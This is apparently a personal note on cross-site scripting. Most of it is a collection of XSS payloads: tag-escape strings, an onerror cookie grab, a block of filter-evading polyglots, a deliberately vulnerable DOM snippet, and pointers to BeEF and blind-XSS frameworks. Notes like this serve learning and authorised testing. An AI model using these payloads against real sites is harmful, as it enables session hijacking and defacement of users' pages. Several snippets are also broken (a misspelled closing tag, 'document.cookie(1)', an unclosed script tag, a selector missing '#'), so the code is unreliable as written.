- Simple example of XSS:
```
<script>alert(document.cookie(1))</scipt>
```
- Simple second example:
Escape ```<input value="">``` you start with ```"">``` then payload
- Simple third example appearing in tab name:
Assigning field to ```<title>``` close that assignment and run payload ```<\title>```
- Simple fourth example :
Appearing in address bar with html encode:
Script assign var name = you able to close '; and adding // section ';+alert(1)// rest commented
Check OWASP XSS filter evasion cheatsheet
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
Javascript events (usefull)
OnError
```
<img src=x onError=alert(document.cookie)>
```

#### Tools
beef
Polyglots - https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot 

#### Blind XSS frameworks
Sleepy puppy - https://github.com/Netflix-Skunkworks/sleepy-puppy
XSS hunter - https://github.com/mandatoryprogrammer/xsshunter
Ground control - https://github.com/jobertabma/ground-control


```
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//

'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">

javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*

javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a

javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/

javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*

javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*

javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//

javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*

--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*

/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*

javascript://--></title></style></textarea></script><svg "//' onclick=alert()//

/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`
```
## XSS Mindmap
![[XSS mindmap.png]]


#### Reflected XSS
When web app produces error message when you type in wrong user name and passwd
( example.com/login.php?error=The+email+or+password+you+entered+is+not+valid.+Please+try+again.) 

in error could insert javascript
error=<script>alert("TEST")</script>

#### Stored XSS
user input get stored in database

#### DOM XSS
user input supplied input passes it into a JavaScript function that modify document object model
```
<html>
<h1> You Searched for:</h1>
<div id ="searchquery"> </div>
<script>
var keyword = location.search.substring(3);
document.querySelector('searchquery').innerHTML = keyword;
<script>
</html>
```
#### STORED XSS via SVG file

